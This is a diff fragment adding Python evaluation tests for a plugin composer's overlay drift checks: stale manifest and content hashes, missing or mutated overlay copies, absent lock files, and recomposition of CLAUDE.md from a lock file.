+def eval_ovl_015():
+    """EVAL-OVL-015: drift_check detects stale overlay manifest"""
+    from composer import drift_check
+
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl015_")
+    try:
+        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        # Mutate the lock's manifest_hash to simulate manifest drift.
+        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
+        lock_data["overlays"][0]["manifest_hash"] = "sha256:0000000000000000000000000000000000000000000000000000000000000000"
+        with open(lock_path, "w", encoding="utf-8") as fh:
+            json.dump(lock_data, fh, indent=2)
+
+        result = drift_check(plugin_root, project_path)
+        if result["status"] != "stale_overlay":
+            errors.append(f"expected status 'stale_overlay', got {result['status']!r}")
+        stale_msgs = [d for d in result["details"] if d["type"] == "stale_manifest"]
+        if not stale_msgs:
+            errors.append("expected a stale_manifest detail entry")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-015",
+        "drift_check detects stale overlay manifest",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_016():
+    """EVAL-OVL-016: drift_check detects stale overlay content"""
+    from composer import drift_check
+
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl016_")
+    try:
+        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        # Mutate the lock's content_hash to simulate content drift.
+        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
+        lock_data["overlays"][0]["content_hash"] = "sha256:0000000000000000000000000000000000000000000000000000000000000000"
+        with open(lock_path, "w", encoding="utf-8") as fh:
+            json.dump(lock_data, fh, indent=2)
+
+        result = drift_check(plugin_root, project_path)
+        if result["status"] != "stale_overlay":
+            errors.append(f"expected status 'stale_overlay', got {result['status']!r}")
+        stale_msgs = [d for d in result["details"] if d["type"] == "stale_content"]
+        if not stale_msgs:
+            errors.append("expected a stale_content detail entry")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-016",
+        "drift_check detects stale overlay content",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_017():
+    """EVAL-OVL-017: drift_check detects missing overlay source path"""
+    from composer import drift_check
+
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl017_")
+    try:
+        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        # Point the lock at a non-existent source path.
+        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
+        lock_data["overlays"][0]["source_path"] = "/nonexistent/path/to/overlay"
+        with open(lock_path, "w", encoding="utf-8") as fh:
+            json.dump(lock_data, fh, indent=2)
+
+        result = drift_check(plugin_root, project_path)
+        if result["status"] != "broken":
+            errors.append(f"expected status 'broken', got {result['status']!r}")
+        missing_msgs = [d for d in result["details"] if d["type"] == "missing_source"]
+        if not missing_msgs:
+            errors.append("expected a missing_source detail entry")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-017",
+        "drift_check detects missing overlay source path",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_018():
+    """EVAL-OVL-018: drift_check detects missing project-local overlay copy"""
+    from composer import drift_check
+
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl018_")
+    try:
+        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        # Remove the project-local overlay copy.
+        local_dir = os.path.join(project_path, ".system2", "overlays", "test-overlay")
+        if os.path.isdir(local_dir):
+            shutil.rmtree(local_dir)
+
+        result = drift_check(plugin_root, project_path)
+        if result["status"] != "broken":
+            errors.append(f"expected status 'broken', got {result['status']!r}")
+        missing_msgs = [d for d in result["details"] if d["type"] == "missing_local"]
+        if not missing_msgs:
+            errors.append("expected a missing_local detail entry")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-018",
+        "drift_check detects missing project-local overlay copy",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_019():
+    """EVAL-OVL-019: --from-lock recomposes using locked overlay paths"""
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl019_")
+    try:
+        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        # Verify lock file has source_path entries.
+        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
+        with open(lock_path, "r", encoding="utf-8") as fh:
+            lock = json.load(fh)
+        source_paths = [ov["source_path"] for ov in lock.get("overlays", [])]
+        if not source_paths:
+            errors.append("lock file has no overlay source paths")
+        else:
+            # Remove CLAUDE.md to verify recomposition writes it.
+            claude_md_path = os.path.join(project_path, "CLAUDE.md")
+            if os.path.isfile(claude_md_path):
+                os.unlink(claude_md_path)
+
+            # Run composer with --from-lock.
+            cmd = [
+                sys.executable, str(REPO_ROOT / PLUGIN_DIR / "scripts" / "composer.py"),
+                "--base", plugin_root,
+                "--project", project_path,
+                "--from-lock",
+                "--format", "json",
+            ]
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+            if proc.returncode != 0:
+                errors.append(f"--from-lock exited with code {proc.returncode}: {proc.stderr}")
+            elif not os.path.isfile(claude_md_path):
+                errors.append("--from-lock did not write CLAUDE.md")
+            else:
+                with open(claude_md_path, "r", encoding="utf-8") as fh:
+                    first_line = fh.readline()
+                if not first_line.startswith("<!-- COMPOSED:"):
+                    errors.append("recomposed CLAUDE.md missing COMPOSED header")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-019",
+        "--from-lock recomposes using locked overlay paths",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_020():
+    """EVAL-OVL-020: drift_check returns 'no_lock' when lock file is absent"""
+    from composer import drift_check
+
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl020_")
+    try:
+        project_path = os.path.join(tmp_dir, "empty-project")
+        os.makedirs(project_path)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        result = drift_check(plugin_root, project_path)
+        if result["status"] != "no_lock":
+            errors.append(f"expected status 'no_lock', got {result['status']!r}")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-020",
+        "drift_check returns 'no_lock' when lock file is absent",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_021():
+    """EVAL-OVL-021: doctor skill file exists with correct frontmatter"""
+    path = f"{PLUGIN_DIR}/skills/doctor/SKILL.md"
+    errors = []
+    if not file_exists(path):
+        errors.append(f"{path} does not exist")
+    else:
+        content = read_file(path)
+        fm = extract_frontmatter(content)
+        if fm is None:
+            errors.append("SKILL.md has no YAML frontmatter")
+        else:
+            if "name: doctor" not in fm:
+                errors.append("frontmatter missing 'name: doctor'")
+            if "description:" not in fm:
+                errors.append("frontmatter missing description")
+        if "--doctor" not in content:
+            errors.append("SKILL.md does not reference --doctor flag")
+        if "read-only" not in content.lower() and "read only" not in content.lower():
+            errors.append("SKILL.md should describe the command as read-only")
+
+    record(
+        "EVAL-OVL-021",
+        "doctor skill file exists with correct frontmatter",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_022():
+    """EVAL-OVL-022: drift_check detects mutated project-local overlay copy"""
+    from composer import drift_check
+
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl022_")
+    try:
+        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        # Mutate a file in the project-local overlay copy.
+        local_principles = os.path.join(
+            project_path, ".system2", "overlays", "test-overlay",
+            "contributions", "orchestrator", "principles.md",
+        )
+        if not os.path.isfile(local_principles):
+            errors.append(f"local principles file not found at {local_principles}")
+        else:
+            with open(local_principles, "a", encoding="utf-8") as fh:
+                fh.write("\n<!-- injected mutation -->")
+
+            result = drift_check(plugin_root, project_path)
+            if result["status"] != "stale_overlay":
+                errors.append(f"expected status 'stale_overlay', got {result['status']!r}")
+            stale_msgs = [d for d in result["details"] if d["type"] == "stale_local"]
+            if not stale_msgs:
+                errors.append("expected a stale_local detail entry")
+            ov_statuses = [o for o in result["overlays"] if o["name"] == "test-overlay"]
+            if ov_statuses and ov_statuses[0].get("local_match") is not False:
+                errors.append("expected local_match=False on overlay status")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-022",
+        "drift_check detects mutated project-local overlay copy",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+# ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
 
@@ -1054,10 +2215,38 @@ ALL_EVALS = [
     eval_sec_002,
     eval_sec_003,
     eval_sec_004,
+    eval_sec_005,
+    eval_sec_006,
     # Maintenance
     eval_maint_001,
     eval_maint_002,
     eval_maint_003,
+    # Overlay
+    eval_ovl_001,
+    eval_ovl_002,
+    eval_ovl_003,
+    eval_ovl_004,
+    eval_ovl_005,
+    # Overlay: REQ-OVL-051 regression
+    eval_ovl_006,
+    # Overlay: conflict detection
+    eval_ovl_007,
+    eval_ovl_008,
+    eval_ovl_009,
+    eval_ovl_010,
+    eval_ovl_011,
+    eval_ovl_012,
+    # Overlay: doctor / drift-check
+    eval_ovl_013,
+    eval_ovl_014,
+    eval_ovl_015,
+    eval_ovl_016,
+    eval_ovl_017,
+    eval_ovl_018,
+    eval_ovl_019,
+    eval_ovl_020,
+    eval_ovl_021,
+    eval_ovl_022,
 ]
 
 
@@ -1095,6 +2284,7 @@ def main():
         "DOC": "Documentation",
         "SEC": "Security",
         "MAINT": "Maintenance",
+        "OVL": "Overlay",
     }
 
     passed = sum(1 for r in results if r.passed)
